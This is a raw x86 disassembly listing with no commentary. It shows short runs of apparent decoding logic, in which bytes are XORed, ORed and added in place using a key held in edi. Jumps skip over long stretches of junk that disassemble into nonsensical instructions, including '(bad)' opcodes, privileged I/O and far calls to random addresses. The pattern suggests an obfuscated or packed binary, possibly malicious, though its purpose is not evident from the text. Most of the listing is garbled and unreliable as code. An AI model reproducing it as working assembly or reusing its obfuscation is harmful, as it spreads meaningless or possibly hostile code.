  403e4b:	mov    eax,ds:0x13879b17
  403e50:	aaa    
  403e51:	jne    0x403e73
  403e53:	jmp    0xd932d6f1
  403e58:	rcl    BYTE PTR [eax+0x2f0861e],cl
  403e5e:	and    DWORD PTR [eax+ebx*8-0x3c],eax
  403e62:	mov    cl,cl
  403e64:	push   esi
  403e65:	add    edx,DWORD PTR [edi-0x788d67a9]
  403e6b:	xor    al,0x72
  403e6d:	lock push es
  403e6f:	mov    eax,ds:0xc1bcf062
  403e74:	lea    ebp,[edx+0x3b]
  403e77:	mov    ebp,0xfcefbfaa
  403e7c:	push   es
  403e7d:	(bad)  
  403e7e:	ror    DWORD PTR [ecx+0x9a6166e],1
  403e84:	fs or  al,0x5c
  403e87:	repz mov bh,0xbd
  403e8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e8b:	lds    edi,FWORD PTR [edi+0x35fd022]
  403e91:	pop    DWORD PTR [esi+0x71253e8]
  403e97:	pop    eax
  403e98:	sub    eax,0xadff3705
  403e9d:	outs   dx,BYTE PTR ds:[esi]
  403e9e:	(bad)  
  403e9f:	adc    DWORD PTR [ebp+0x74224df3],esp
  403ea5:	push   edi
  403ea6:	xchg   BYTE PTR [ebx],cl
  403ea8:	jp     0x403e52
  403eaa:	mov    dl,0xd8
  403eac:	push   ecx
  403ead:	xchg   esp,eax
  403eae:	lea    eax,[eax+0x59c2bbb7]
  403eb4:	push   esi
  403eb5:	test   eax,0x6c29ea4d
  403eba:	ds popf 
  403ebc:	ja     0x403e98
  403ebe:	mov    bh,0x8a
  403ec0:	adc    DWORD PTR [edi-0x16216c33],esi
  403ec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ec7:	je     0x403f1d
  403ec9:	neg    ebx
  403ecb:	or     DWORD PTR [edx-0x18046487],0xffffffee
  403ed2:	loopne 0x403f08
  403ed4:	and    bl,BYTE PTR [esi-0x24d1f8]
  403eda:	(bad)  
  403edb:	cmc    
  403edc:	jmp    0x2680cb65
  403ee1:	adc    BYTE PTR [ecx+0x45522a96],al
  403ee7:	pop    ebx
  403ee8:	daa    
  403ee9:	daa    
  403eea:	xchg   BYTE PTR [ecx-0x62],bh
  403eed:	and    bl,bl
  403eef:	in     eax,0x22
  403ef1:	xchg   BYTE PTR ds:0x5996b72f,dh
  403ef7:	and    ch,BYTE PTR [edi]
  403ef9:	cmp    DWORD PTR [ecx+edx*4],esp
  403efc:	pop    ecx
  403efd:	push   DWORD PTR [edi-0x42777ad2]
  403f03:	jge    0x403ec9
  403f05:	sbb    bl,bl
  403f07:	mov    ds,esi
  403f09:	sahf   
  403f0a:	cwde   
  403f0b:	retf   0xc9bb
  403f0e:	mul    DWORD PTR [ecx]
  403f10:	ffree  st(0)
  403f12:	and    DWORD PTR [ebx],ecx
  403f14:	xor    al,0xd4
  403f16:	mov    dl,0xdd
  403f18:	jae    0x403ec6
  403f1a:	or     DWORD PTR [ebx],ecx
  403f1c:	cwde   
  403f1d:	push   eax
  403f1e:	jne    0x403ecc
  403f20:	cmp    bh,ch
  403f22:	jmp    0x35fefb74
  403f27:	mov    cl,0x1c
  403f29:	iret   
  403f2a:	fidivr DWORD PTR [ebp+0x7d]
  403f2d:	mov    bl,0x6a
  403f2f:	or     al,0x4e
  403f31:	dec    ebp
  403f32:	int    0xb3
  403f34:	in     eax,0xc
  403f36:	xchg   esp,eax
  403f37:	stos   DWORD PTR es:[edi],eax
  403f38:	mov    edx,0x914b414b
  403f3d:	das    
  403f3e:	int3   
  403f3f:	sub    al,0x6
  403f41:	outs   dx,BYTE PTR ds:[esi]
  403f42:	js     0x403ed1
  403f44:	push   ebx
  403f45:	sbb    BYTE PTR [ebx],dh
  403f47:	ror    BYTE PTR [ebx],cl
  403f49:	push   ebp
  403f4a:	in     al,0x81
  403f4c:	xor    eax,0x42822d
  403f51:	xchg   ecx,eax
  403f52:	add    DWORD PTR [edx+0x0],0xf1ee1c1
  403f59:	mov    dh,0xd
  403f5b:	sbb    eax,0x9004282
  403f60:	or     eax,0x428215
  403f65:	add    edx,DWORD PTR [ebp-0x2c]
  403f68:	sbb    DWORD PTR ds:0x428221,ebx
  403f6e:	add    DWORD PTR [eax],edx
  403f70:	cmp    DWORD PTR ds:0x4282c9,0x0
  403f77:	mov    DWORD PTR ds:0x428195,0x2345
  403f81:	mov    DWORD PTR ds:0x428235,0x47ef
  403f8b:	jmp    0x403fe9
  403f90:	mov    eax,ds:0x428199
  403f95:	mov    DWORD PTR ds:0x428269,edi
  403f9b:	cmp    DWORD PTR ds:0x4282c9,0x0
  403fa2:	jne    0x403fcb
  403fa8:	push   DWORD PTR [ebp-0x10]
  403fab:	push   0x11d2
  403fb0:	push   0x16e4
  403fb5:	push   DWORD PTR [ebp-0x18]
  403fb8:	push   0x5076
  403fbd:	call   DWORD PTR ds:0x4289c8
  403fc3:	xor    DWORD PTR ds:0x42819d,ecx
  403fc9:	or     ecx,edx
  403fcb:	sbb    edx,edx
  403fcd:	mov    ecx,DWORD PTR ds:0x4282bd
  403fd3:	sbb    DWORD PTR ds:0x4281fd,ecx
  403fd9:	or     ecx,DWORD PTR ds:0x428209
  403fdf:	sub    DWORD PTR ds:0x4282bd,0x201a
  403fe9:	mov    eax,DWORD PTR [esi]
  403feb:	mov    ecx,DWORD PTR [esi+0x4]
  403fee:	or     edx,0x58b0
  403ff4:	shrd   eax,ecx,0x2
  403ff8:	shr    ecx,0x2
  403ffb:	mov    ecx,DWORD PTR [esi]
  403ffd:	mov    edx,DWORD PTR [esi+0x4]
  404000:	xor    eax,edi
  404002:	shl    ecx,0x1e
  404005:	xor    edx,edx
  404007:	or     edx,eax
  404009:	mov    DWORD PTR [ebp-0x4],edx
  40400c:	mov    DWORD PTR [ebp-0x30],0xcb89b676
  404013:	mov    eax,0x9d2b8af8
  404018:	mov    DWORD PTR [ebp-0x2c],eax
  40401b:	mov    DWORD PTR [ebp-0x20],0xcb89b672
  404022:	mov    DWORD PTR [ebp-0x1c],eax
  404025:	mov    DWORD PTR [ebp-0x10],0xcb89b67e
  40402c:	mov    DWORD PTR [ebp-0xc],eax
  40402f:	mov    DWORD PTR [ebp-0x60],0xcb89b67a
  404036:	mov    DWORD PTR [ebp-0x5c],eax
  404039:	mov    eax,DWORD PTR [ebp-0x30]
  40403c:	mov    ecx,DWORD PTR [ebp-0x2c]
  40403f:	shrd   eax,ecx,0x2
  404043:	shr    ecx,0x2
  404046:	mov    ecx,DWORD PTR [ebp-0x30]
  404049:	mov    edx,DWORD PTR [ebp-0x2c]
  40404c:	xor    eax,edi
  40404e:	shl    ecx,0x1e
  404051:	xor    edx,edx
  404053:	or     eax,edx
  404055:	lea    eax,[ebp+eax*1-0x4]
  404059:	mov    DWORD PTR [ebp-0x34],eax
  40405c:	mov    eax,DWORD PTR [ebp-0x30]
  40405f:	mov    ecx,DWORD PTR [ebp-0x2c]
  404062:	shrd   eax,ecx,0x2
  404066:	shr    ecx,0x2
  404069:	mov    ecx,DWORD PTR [ebp-0x30]
  40406c:	mov    edx,DWORD PTR [ebp-0x2c]
  40406f:	shl    ecx,0x1e
  404072:	mov    ecx,DWORD PTR [ebp-0x14]
  404075:	xor    eax,edi
  404077:	xor    edx,edx
  404079:	or     eax,edx
  40407b:	mov    cl,BYTE PTR [eax+ecx*1]
  40407e:	mov    eax,DWORD PTR [ebp-0x34]
  404081:	xor    BYTE PTR [eax],cl
  404083:	mov    eax,DWORD PTR [ebp-0x20]
  404086:	mov    ecx,DWORD PTR [ebp-0x1c]
  404089:	shrd   eax,ecx,0x2
  40408d:	shr    ecx,0x2
  404090:	mov    ecx,DWORD PTR [ebp-0x20]
  404093:	mov    edx,DWORD PTR [ebp-0x1c]
  404096:	xor    eax,edi
  404098:	shl    ecx,0x1e
  40409b:	xor    edx,edx
  40409d:	or     eax,edx
  40409f:	lea    eax,[ebp+eax*1-0x4]
  4040a3:	mov    DWORD PTR [ebp-0x34],eax
  4040a6:	mov    eax,DWORD PTR [ebp-0x20]
  4040a9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4040ac:	jmp    0x404356
  4040b1:	jecxz  0x4040af
  4040b3:	mov    al,ds:0xec97b487
  4040b8:	mov    ebp,0x2fc8f240
  4040bd:	test   DWORD PTR [eax],ebx
  4040bf:	xchg   ecx,eax
  4040c0:	sti    
  4040c1:	test   esp,esi
  4040c3:	mov    ebx,0xbbbfd0bb
  4040c8:	mov    ebx,0x8ff1cfa
  4040cd:	aas    
  4040ce:	pop    ecx
  4040cf:	cmp    al,0xb4
  4040d1:	push   ebp
  4040d2:	adc    DWORD PTR [ebx+ecx*8-0x614cddbc],0x92d77d1f
  4040dd:	rcr    DWORD PTR [eax-0x15],0x6c
  4040e1:	jne    0x40409c
  4040e3:	out    dx,al
  4040e4:	les    esi,FWORD PTR [esi+eax*8+0x1024085c]
  4040eb:	or     BYTE PTR [ecx+0x64e30175],bl
  4040f1:	mov    eax,0xdd9a3e9
  4040f6:	gs js  0x404127
  4040f9:	adc    al,0xed
  4040fb:	mov    ds:0xfce3b176,al
  404100:	loope  0x404115
  404102:	outs   dx,BYTE PTR ds:[esi]
  404103:	push   esi
  404104:	mov    WORD PTR [eax+0x2d4e038d],ss
  40410a:	pop    eax
  40410b:	or     al,0xea
  40410d:	(bad)  
  40410e:	xchg   DWORD PTR [ecx+0x602ca68e],ebp
  404114:	dec    edx
  404115:	dec    esp
  404116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404117:	adc    ecx,DWORD PTR [ecx+eax*2-0x54bd0822]
  40411e:	add    BYTE PTR [esi+0x6d],cl
  404121:	fistp  WORD PTR [esp+edi*1-0x40]
  404125:	sub    edx,edx
  404127:	fs loope 0x404150
  40412a:	test   DWORD PTR [edi],esi
  40412c:	add    eax,0xf6884db1
  404131:	inc    eax
  404132:	ins    DWORD PTR es:[edi],dx
  404133:	dec    edi
  404134:	loopne 0x404138
  404136:	mov    ebx,esi
  404138:	mov    edi,0xc62ffb7a
  40413d:	loopne 0x404151
  40413f:	sub    eax,0xf074002a
  404144:	in     al,dx
  404145:	jbe    0x4040ce
  404147:	and    eax,0xeddf44f0
  40414c:	test   DWORD PTR [ecx-0x6b8f4784],edi
  404152:	mov    edx,0xfb553de3
  404157:	into   
  404158:	cmp    eax,0x9baf4ebc
  40415d:	scas   eax,DWORD PTR es:[edi]
  40415e:	and    DWORD PTR [ebx+edi*8],esp
  404161:	ret    0x7f64
  404164:	es lahf 
  404166:	and    DWORD PTR [eax+0x75ddb438],edi
  40416c:	ds push edx
  40416e:	test   DWORD PTR [eax+0x2b],edx
  404171:	lods   eax,DWORD PTR ds:[esi]
  404172:	retf   
  404173:	xor    esp,esi
  404175:	sbb    edi,DWORD PTR [eax]
  404177:	dec    esp
  404178:	repnz push ebp
  40417a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40417b:	stos   DWORD PTR es:[edi],eax
  40417c:	ins    DWORD PTR es:[edi],dx
  40417d:	and    esi,DWORD PTR [ecx+0x41]
  404180:	clc    
  404181:	fsubr  st,st(3)
  404183:	xchg   DWORD PTR [esi-0x1373440c],ebp
  404189:	bound  eax,QWORD PTR [ebx-0x7e]
  40418c:	xor    eax,0x9e289fb5
  404191:	into   
  404192:	pusha  
  404193:	add    DWORD PTR [ecx+0x13fc51ff],ebp
  404199:	add    ebx,DWORD PTR [edi-0x5c]
  40419c:	in     al,dx
  40419d:	and    DWORD PTR [edi+0x0],ebp
  4041a0:	(bad)  
  4041a1:	jbe    0x4041a8
  4041a3:	adc    BYTE PTR [ecx-0x36],0x3a
  4041a7:	sub    BYTE PTR [eax-0x5c9d711a],ch
  4041ad:	nop
  4041ae:	jb     0x4041b9
  4041b0:	and    al,0x35
  4041b2:	mov    edx,0x8bb29324
  4041b7:	lods   al,BYTE PTR ds:[esi]
  4041b8:	xchg   esp,eax
  4041b9:	sbb    eax,0xbdc08840
  4041be:	retf   
  4041bf:	mov    edi,0xdac7a395
  4041c4:	mov    esp,ss
  4041c6:	cmc    
  4041c7:	dec    edx
  4041c8:	mov    eax,0x4b8acef9
  4041cd:	cmc    
  4041ce:	inc    ecx
  4041cf:	cmp    bl,ch
  4041d1:	sub    DWORD PTR [eax-0x4092c569],esi
  4041d7:	mov    al,0xad
  4041d9:	mov    ecx,0x712e9c38
  4041de:	lods   eax,DWORD PTR ds:[esi]
  4041df:	mov    cl,0xe6
  4041e1:	es mov al,0x48
  4041e4:	inc    ecx
  4041e5:	jecxz  0x404183
  4041e7:	mov    ah,BYTE PTR [ebp-0x2855cefb]
  4041ed:	mov    ebp,0xda745b2a
  4041f2:	and    ah,dh
  4041f4:	mov    esi,0x7f81ec6e
  4041f9:	sti    
  4041fa:	pushf  
  4041fb:	mov    esp,0xe1587518
  404200:	cli    
  404201:	call   0x21abdb6f
  404206:	out    dx,al
  404207:	shl    BYTE PTR [esi+0x18fbe28c],1
  40420d:	mov    ebx,0xb7c8e293
  404212:	gs xchg ebp,eax
  404214:	out    dx,al
  404215:	sub    al,BYTE PTR [ebp+0x5274db2a]
  40421b:	or     dh,BYTE PTR [ebx+eiz*8-0x2f]
  40421f:	ja     0x40429d
  404221:	xor    al,0x4
  404223:	call   0x5be209ea
  404228:	call   0x9d1daeff
  40422d:	imul   edi,esi,0x826ae058
  404233:	or     BYTE PTR [edi+esi*4-0x30d47a56],dh
  40423a:	js     0x4041bd
  40423c:	and    eax,esp
  40423e:	rol    ecx,0xf8
  404241:	lds    ebp,FWORD PTR [edx+0x43498bd7]
  404247:	jmp    0x40428c
  404249:	inc    ebx
  40424a:	pop    edi
  40424b:	fstsw  WORD PTR cs:[edx-0x47a922cb]
  404253:	mov    ecx,0x380d3425
  404258:	pop    ebp
  404259:	add    eax,0x6961ee16
  40425e:	push   esi
  40425f:	in     eax,dx
  404260:	icebp  
  404261:	sbb    al,0x4b
  404263:	push   ecx
  404264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404265:	mov    dh,BYTE PTR ds:0x64c9eb71
  40426b:	push   ds
  40426c:	sbb    ch,BYTE PTR [ecx-0x35]
  40426f:	xchg   edi,eax
  404270:	mov    dh,0x55
  404272:	mov    edx,0xe091301b
  404277:	mov    ebp,0x8b353eda
  40427c:	retf   
  40427d:	ror    DWORD PTR [edx-0x27],0x5a
  404281:	xchg   esp,eax
  404282:	hlt    
  404283:	stc    
  404284:	mov    DWORD PTR [esi-0x65],edx
  404287:	test   eax,0xe0461174
  40428c:	cmp    edx,DWORD PTR [edx-0x67]
  40428f:	add    bh,BYTE PTR [eax+edi*4+0x47ace782]
  404296:	pusha  
  404297:	dec    ecx
  404298:	mov    ah,bh
  40429a:	sub    esp,DWORD PTR ds:0xc463e90f
  4042a0:	shl    dh,1
  4042a2:	mov    edx,0x8961104b
  4042a7:	mov    al,0x3b
  4042a9:	mov    ah,0xe
  4042ab:	sbb    cl,BYTE PTR [ebx+eiz*2+0x37]
  4042af:	out    0xb4,al
  4042b1:	mov    ebx,0xe89f888d
  4042b6:	mov    edx,0x82712d92
  4042bb:	mov    esp,0xac5a8492
  4042c0:	mov    bl,0xab
  4042c2:	cmp    al,0x69
  4042c4:	cmp    eax,0x8f139568
  4042c9:	fsub   DWORD PTR ds:0xb6843978
  4042cf:	mov    bl,0x52
  4042d1:	xchg   esi,edx
  4042d3:	(bad)  
  4042d5:	push   ebx
  4042d6:	clc    
  4042d7:	push   esp
  4042d8:	push   cs
  4042d9:	mov    esp,0xa55c7815
  4042de:	es ss in al,0x39
  4042e2:	clc    
  4042e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042e4:	popa   
  4042e5:	pushf  
  4042e6:	pextrw esi,(bad),0xc5
  4042e8:	ja     0x4042a8
  4042ea:	dec    edx
  4042eb:	mov    eax,0x7bd9a33e
  4042f0:	inc    esp
  4042f1:	xchg   edi,eax
  4042f2:	pop    edi
  4042f3:	cmp    eax,0xaf0ff62
  4042f8:	popa   
  4042f9:	inc    edx
  4042fa:	sub    dh,BYTE PTR [ebp-0x4c]
  4042fd:	jecxz  0x404289
  4042ff:	dec    ebx
  404300:	stc    
  404301:	xor    BYTE PTR [eax-0x529c0ac],dh
  404307:	push   ebx
  404308:	mov    al,0xd
  40430a:	popf   
  40430b:	xor    ah,BYTE PTR [esp+eiz*8-0x93cfb21]
  404312:	cwde   
  404313:	fsubr  DWORD PTR [esi]
  404315:	(bad)  
  404316:	icebp  
  404317:	sahf   
  404318:	shl    BYTE PTR [ebx],0xb5
  40431b:	cmc    
  40431c:	xchg   esp,eax
  40431d:	xor    DWORD PTR [ecx],0x49
  404320:	dec    ebx
  404321:	in     eax,dx
  404322:	jnp    0x4042ba
  404324:	cmc    
  404325:	add    DWORD PTR [edi+eiz*1-0x36],ebp
  404329:	sub    BYTE PTR [esi-0x58],dh
  40432c:	aam    0xf9
  40432e:	inc    ebx
  40432f:	clc    
  404330:	cmp    DWORD PTR [ebx-0x13],ebx
  404333:	int    0x15
  404335:	fstp   TBYTE PTR [eax-0x4223013a]
  40433b:	xor    ch,bh
  40433d:	or     al,0x74
  40433f:	inc    ebp
  404340:	mov    eax,ds:0x647896f3
  404345:	xor    BYTE PTR [ecx-0x60832a47],ah
  40434b:	stos   DWORD PTR es:[edi],eax
  40434c:	mov    ebp,0x471b0855
  404351:	xlat   BYTE PTR ds:[ebx]
  404352:	minps  xmm2,XMMWORD PTR [ecx]
  404355:	xor    BYTE PTR [edi],cl
  404357:	lods   al,BYTE PTR ds:[esi]
  404358:	enter  0xc102,0xe9
  40435c:	add    cl,BYTE PTR [ebx+0x558be04d]
  404362:	in     al,0xc1
  404364:	loope  0x404384
  404366:	mov    ecx,DWORD PTR [ebp-0x14]
  404369:	xor    eax,edi
  40436b:	xor    edx,edx
  40436d:	or     eax,edx
  40436f:	mov    cl,BYTE PTR [eax+ecx*1]
  404372:	mov    eax,DWORD PTR [ebp-0x34]
  404375:	or     BYTE PTR [eax],cl
  404377:	mov    eax,DWORD PTR [ebp-0x10]
  40437a:	mov    ecx,DWORD PTR [ebp-0xc]
  40437d:	shrd   eax,ecx,0x2
  404381:	shr    ecx,0x2
  404384:	mov    ecx,DWORD PTR [ebp-0x10]
  404387:	mov    edx,DWORD PTR [ebp-0xc]
  40438a:	xor    eax,edi
  40438c:	shl    ecx,0x1e
  40438f:	xor    edx,edx
  404391:	jmp    0x40463b
  404396:	in     eax,dx
  404397:	cli    
  404398:	js     0x404381
  40439a:	mov    esp,0x60007cbc
  40439f:	push   eax
  4043a0:	or     eax,0xccb75505
  4043a5:	das    
  4043a6:	xchg   edx,eax
  4043a7:	idiv   BYTE PTR [ebx-0x44402f45]
  4043ad:	mov    ebx,0x52f084ba
  4043b2:	sub    BYTE PTR [ebx+0x75d26415],ah
  4043b8:	ret    
  4043b9:	xor    BYTE PTR [ecx+0x49db1d62],dh
  4043bf:	inc    edx
  4043c0:	inc    ebx
  4043c1:	or     edi,esp
  4043c3:	ss jb  0x4043a8
  4043c6:	daa    
  4043c7:	sub    edx,DWORD PTR [ecx]
  4043c9:	out    dx,al
  4043ca:	loopne 0x4043bb
  4043cc:	push   0xc8cd560e
  4043d1:	in     al,0xa6
  4043d3:	xchg   edi,eax
  4043d4:	or     esi,ecx
  4043d6:	jae    0x4043d7
  4043d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043d9:	retf   
  4043da:	cmp    eax,DWORD PTR [eax]
  4043dc:	xchg   esi,eax
  4043dd:	(bad)  
  4043de:	pop    ds
  4043df:	imul   edi,DWORD PTR [ebp+edi*4-0x2cdbaa77],0x5d
  4043e7:	je     0x404440
  4043e9:	cdq    
  4043ea:	fcmovnb st,st(7)
  4043ec:	pop    edx
  4043ed:	ds xchg ecx,eax
  4043ef:	xchg   ecx,eax
  4043f0:	shl    BYTE PTR [ebx-0x6eb75cb4],0x4b
  4043f7:	mov    ds:0x6a8151e7,eax
  4043fc:	pop    edx
  4043fd:	push   ebx
  4043fe:	push   ebp
  4043ff:	stos   DWORD PTR es:[edi],eax
  404400:	mov    cl,0xf0
  404402:	int3   
  404403:	imul   eax,ebx,0xffffffed
  404406:	push   ds
  404407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404408:	movups xmm3,xmm7
  40440b:	add    bl,al
  40440d:	push   0x7
  40440f:	and    ah,ch
  404411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404412:	bound  edx,QWORD PTR [ebp-0x73]
  404415:	js     0x4043ab
  404417:	(bad)  
  404418:	out    dx,al
  404419:	in     eax,dx
  40441a:	popa   
  40441b:	jecxz  0x404486
  40441d:	push   esi
  40441e:	and    DWORD PTR [edi],ebp
  404420:	push   ebx
  404421:	test   eax,0x3dcae502
  404426:	in     al,dx
  404427:	mov    ah,0x5d
  404429:	rcr    DWORD PTR [ecx-0x2d],1
  40442c:	fsub   QWORD PTR [edx-0x4269093e]
  404432:	sub    bh,cl
  404434:	xchg   edx,eax
  404435:	cwde   
  404436:	add    al,dl
  404438:	mov    edi,0x2b3a1d7f
  40443d:	mov    ch,0x61
  40443f:	add    eax,0x317bca59
  404444:	mov    ch,0xa0
  404446:	dec    esp
  404447:	retf   
  404448:	mov    ecx,0x48854d49
  40444d:	les    ebx,FWORD PTR [eax+edx*8+0x3d]
  404451:	xchg   ebp,eax
  404452:	cdq    
  404453:	rol    DWORD PTR [ebx+edi*2],cl
  404456:	push   cs
  404457:	shl    DWORD PTR [eax+0x69],cl
  40445a:	call   0xf90d77e1
  40445f:	mov    dl,0x13
  404461:	shr    esi,0x2d
  404464:	pusha  
  404465:	ret    0x26ba
  404468:	aas    
  404469:	and    eax,0xa75f768f
  40446e:	jle    0x404422
  404470:	jp     0x4044c0
  404472:	les    ebp,FWORD PTR [ebx+0x382a0173]
  404478:	push   ds
  404479:	in     al,dx
  40447a:	mov    ebx,0x63db02d4
  40447f:	add    DWORD PTR [ebx-0x19],ebx
  404482:	cmp    DWORD PTR [eax],edi
  404484:	pusha  
  404485:	adc    al,0xb2
  404487:	jns    0x4044cb
  404489:	mov    ebp,0xd229c7cf
  40448e:	inc    ebx
  40448f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404490:	sahf   
  404491:	push   ds
  404492:	outs   dx,BYTE PTR ds:[esi]
  404493:	mov    eax,ds:0xe2d18315
  404498:	pusha  
  404499:	fild   QWORD PTR [ecx+0x1e49c92d]
  40449f:	add    eax,0xa9f2e25c
  4044a4:	sub    eax,DWORD PTR gs:[ebx+0x74d2c8b7]
  4044ab:	mov    eax,0x11597846
  4044b0:	fcomp  QWORD PTR [ebx-0xe1a3fb1]
  4044b6:	jns    0x404512
  4044b8:	cdq    
  4044b9:	push   edi
  4044ba:	mov    dh,0x55
  4044bc:	pop    esp
  4044bd:	xor    DWORD PTR [esi-0x630e2de],ebx
  4044c3:	cmc    
  4044c4:	repz cmp ecx,DWORD PTR [ebx+0x44]
  4044c8:	lods   eax,DWORD PTR gs:[esi]
  4044ca:	inc    esp
  4044cb:	lea    ebx,[edx-0x76]
  4044ce:	or     cl,0x8b
  4044d1:	mov    edi,DWORD PTR [edi]
  4044d3:	ss daa 
  4044d5:	leave  
  4044d6:	retf   0x5d31
  4044d9:	push   esp
  4044da:	ds push ecx
  4044dc:	ss test eax,0x46ba4313
  4044e2:	mov    ebx,0xcce28416
  4044e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044e8:	sub    dl,bl
  4044ea:	sub    DWORD PTR [edi+ecx*8+0x368e730f],edx
  4044f1:	fsubr  st,st(2)
  4044f3:	call   0x429bdde1
  4044f8:	adc    bh,0x2b
  4044fb:	push   edi
  4044fc:	push   edi
  4044fd:	call   0x50a4ed8
  404502:	loope  0x4044c5
  404504:	pop    edi
  404505:	xchg   edi,eax
  404506:	test   bh,ah
  404508:	out    dx,al
  404509:	jbe    0x40455d
  40450b:	pop    ss
  40450c:	jbe    0x404580
  40450e:	pop    ss
  40450f:	push   ds
  404510:	pop    ebx
  404511:	jg     0x4044f7
  404513:	les    ecx,FWORD PTR [eax+eax*8]
  404516:	fidivr WORD PTR [ecx+0x4b]
  404519:	and    ebp,DWORD PTR [edi-0x42c87dd4]
  40451f:	mov    ebp,0x336fa740
  404524:	add    eax,0x850540c1
  404529:	mov    bl,0xf
  40452b:	or     eax,0x8223aa16
  404530:	inc    ebx
  404531:	mov    ecx,0x43b6984a
  404536:	and    ch,bh
  404538:	sbb    DWORD PTR [esi+0x12],esi
  40453b:	pop    esi
  40453c:	fdiv   DWORD PTR [edx]
  40453e:	cmp    edx,edx
  404540:	stc    
  404541:	dec    esi
  404542:	or     edx,ebp
  404544:	mov    ds:0xfd4baee5,eax
  404549:	mov    ds:0xaf39a5d0,al
  40454e:	fldln2 
  404550:	call   0x732:0xc3c90d79
  404557:	test   eax,0x9619b5d2
  40455c:	ss jno 0x404545
  40455f:	cmp    edi,eax
  404561:	sbb    eax,0xdf1c7fd4
  404566:	icebp  
  404567:	push   ecx
  404568:	jp     0x40453f
  40456a:	sar    DWORD PTR [ecx+0x68b0819a],0xa7
  404571:	lea    edi,[edi]
  404573:	ss daa 
  404575:	mov    cl,0x30
  404577:	cs (bad) 
  404579:	cli    
  40457a:	sub    edx,DWORD PTR [ecx+eax*8+0x4]
  40457e:	sbb    eax,0xbca463d2
  404583:	and    eax,0x73c22ba4
  404588:	dec    edi
  404589:	ficom  DWORD PTR [esi+0x79]
  40458c:	addr16 shl eax,cl
  40458f:	dec    edi
  404590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404591:	idiv   dh
  404593:	stc    
  404594:	clc    
  404595:	xlat   BYTE PTR ds:[ebx]
  404596:	inc    ebp
  404597:	repz dec esi
  404599:	adc    edi,DWORD PTR [ecx]
  40459b:	and    eax,0x4ef8941d
  4045a0:	sbb    al,0x3e
  4045a2:	stos   BYTE PTR es:[edi],al
  4045a3:	cwde   
  4045a4:	xchg   esi,eax
  4045a5:	jae    0x404544
  4045a7:	mov    ecx,0xbaf7ea75
  4045ac:	sub    esp,edx
  4045ae:	and    BYTE PTR [ecx+0x1235971c],ah
  4045b4:	test   BYTE PTR [eax],bh
  4045b6:	dec    ebp
  4045b7:	jg     0x404541
  4045b9:	jb     0x4045eb
  4045bb:	mov    bl,0x24
  4045bd:	ins    DWORD PTR es:[edi],dx
  4045be:	adc    ebx,0xb4082f77
  4045c4:	jo     0x404611
  4045c6:	ret    0x3d8d
  4045c9:	nop
  4045ca:	inc    esi
  4045cb:	out    dx,al
  4045cc:	ret    
  4045cd:	inc    ebx
  4045ce:	arpl   WORD PTR [edx],bp
  4045d0:	dec    BYTE PTR [eax+0x4dc3da04]
  4045d6:	repnz nop
  4045d8:	fstp   QWORD PTR [edx]
  4045da:	(bad)  
  4045db:	mov    cs,ebx
  4045dd:	test   al,0x53
  4045df:	and    BYTE PTR [edx+0x7a],dh
  4045e2:	shr    DWORD PTR [edi-0x12787d1c],cl
  4045e8:	pop    ss
  4045e9:	aad    0x21
  4045eb:	ror    BYTE PTR [edi+0x40f5e35c],0xfb
  4045f2:	fs loop 0x4045a2
  4045f5:	pushf  
  4045f6:	imul   ecx,DWORD PTR [ecx-0x22],0xffffffee
  4045fa:	push   edi
  4045fb:	mov    edx,DWORD PTR [eax-0x269360bd]
  404601:	cmp    edx,DWORD PTR [esi+0x2a]
  404604:	fucomip st,st(4)
  404606:	outs   dx,DWORD PTR ds:[esi]
  404607:	jg     0x40465d
  404609:	jl     0x4045bb
  40460b:	xor    al,BYTE PTR [edi-0x6a]
  40460e:	(bad)  
  40460f:	aas    
  404610:	ja     0x4045c2
  404612:	adc    edi,esi
  404614:	cdq    
  404615:	add    esp,DWORD PTR [edx]
  404617:	xchg   ebp,eax
  404618:	mov    dl,0x75
  40461a:	idiv   BYTE PTR [ebp-0x19]
  40461d:	xchg   esp,eax
  40461e:	dec    edi
  40461f:	jl     0x40465d
  404621:	shr    ch,cl
  404623:	push   ebp
  404624:	pop    ss
  404625:	jmp    0x5921:0x7601bdb7
  40462c:	fnstcw WORD PTR [edi]
  40462e:	int    0xed
  404630:	jle    0x4045ff
  404632:	shr    eax,0x99
  404635:	add    ah,ah
  404637:	xchg   ebp,eax
  404638:	arpl   WORD PTR [ecx],si
  40463a:	cli    
  40463b:	or     eax,edx
  40463d:	lea    eax,[ebp+eax*1-0x4]
  404641:	mov    DWORD PTR [ebp-0x34],eax
  404644:	mov    eax,DWORD PTR [ebp-0x10]
  404647:	mov    ecx,DWORD PTR [ebp-0xc]
  40464a:	shrd   eax,ecx,0x2
  40464e:	shr    ecx,0x2
  404651:	mov    ecx,DWORD PTR [ebp-0x10]
  404654:	mov    edx,DWORD PTR [ebp-0xc]
  404657:	xor    eax,edi
  404659:	shl    ecx,0x1e
  40465c:	mov    ecx,DWORD PTR [ebp-0x14]
  40465f:	xor    edx,edx
  404661:	or     eax,edx
  404663:	mov    cl,BYTE PTR [eax+ecx*1]
  404666:	mov    eax,DWORD PTR [ebp-0x34]
  404669:	add    BYTE PTR [eax],cl
  40466b:	mov    eax,DWORD PTR [ebp-0x60]
  40466e:	mov    ecx,DWORD PTR [ebp-0x5c]
  404671:	shrd   eax,ecx,0x2
  404675:	shr    ecx,0x2
  404678:	mov    ecx,DWORD PTR [ebp-0x60]
  40467b:	mov    edx,DWORD PTR [ebp-0x5c]
  40467e:	xor    eax,edi
  404680:	xor    edx,edx
  404682:	or     eax,edx
  404684:	lea    eax,[ebp+eax*1-0x4]
  404688:	mov    DWORD PTR [ebp-0x34],eax
  40468b:	mov    eax,DWORD PTR [ebp-0x60]
  40468e:	shl    ecx,0x1e
  404691:	mov    ecx,DWORD PTR [ebp-0x5c]
